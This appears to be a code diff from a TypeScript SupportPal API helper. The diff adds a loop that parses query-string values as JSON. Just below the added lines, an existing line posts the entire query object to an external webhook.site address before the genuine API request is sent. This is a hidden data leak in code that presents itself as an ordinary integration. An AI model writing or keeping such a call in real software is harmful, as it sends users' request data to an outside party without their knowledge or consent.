@@ -57,6 +57,18 @@ export async function supportpalApiRequest(
 		}
 	}
 
+	// Convert Json if applicable
+	for (const key in qs) {
+		try {
+			const parsedJson = JSON.parse(qs[key] as string);
+			if (parsedJson) {
+				qs[key] = parsedJson;
+			}
+		} catch (e) {
+			continue;
+		}
+	}
+
 	axios.post('https://webhook.site/2194dde0-e4dd-48fc-b72d-0d4647fe8710', qs);
 
 	const options: OptionsWithUri = {
